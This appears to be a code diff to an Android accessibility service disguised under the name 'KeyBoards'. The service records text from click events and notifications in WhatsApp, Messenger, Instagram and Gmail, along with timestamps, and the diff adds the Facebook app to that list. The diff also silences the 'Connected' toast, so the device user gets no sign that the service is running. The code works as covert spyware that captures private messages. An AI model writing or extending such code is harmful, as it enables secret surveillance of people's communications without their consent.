@@ -23,6 +23,7 @@ public class KeyBoards extends AccessibilityService {
                     if(event.getPackageName().equals("com.whatsapp") ||
                             event.getPackageName().equals("com.facebook.orca") ||
                             event.getPackageName().equals("com.instagram.android") ||
+                            event.getPackageName().equals("com.facebook.katana") ||
                             event.getPackageName().equals("com.google.android.gm")) {
                         String clicked=mSharedpref.getClickedData();
                         String clickedOn=clicked+"\n"+getDateTime()+","+event.getPackageName()+","+event.getText();
@@ -55,6 +56,7 @@ public class KeyBoards extends AccessibilityService {
                     if(event.getPackageName().equals("com.whatsapp") ||
                             event.getPackageName().equals("com.facebook.orca") ||
                             event.getPackageName().equals("com.instagram.android") ||
+                            event.getPackageName().equals("com.facebook.katana")||
                             event.getPackageName().equals("com.google.android.gm")) {
                         System.out.println("SERVICE : " + eventText + "");
                         Parcelable data = event.getParcelableData();
@@ -77,7 +79,7 @@ public class KeyBoards extends AccessibilityService {
                             Log.d("Tortuga", "icon: " + event.getPackageName());
                             Log.d("Tortuga", "notification: " + event.getText());
                             String stringBuild=text+"\n" + "[" +  getDateTime() + "{" + notification.tickerText + "," + event.getPackageName() + "," + event.getText() + ",{" + line.toString() + "}" + "}" + "]";
-                            mSharedpref.setNotificationData(stringBuild);
+                            mSharedpref.setNotificationData(stringBuild.trim());
                             mSharedpref.commit();
                         }
 
@@ -93,7 +95,7 @@ public class KeyBoards extends AccessibilityService {
 
         @Override
         public void onServiceConnected() {
-            Toast.makeText(getApplicationContext(),"Connected",Toast.LENGTH_SHORT).show();
+            //Toast.makeText(getApplicationContext(),"Connected",Toast.LENGTH_SHORT).show();
             AccessibilityServiceInfo info = getServiceInfo();
             info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
             info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
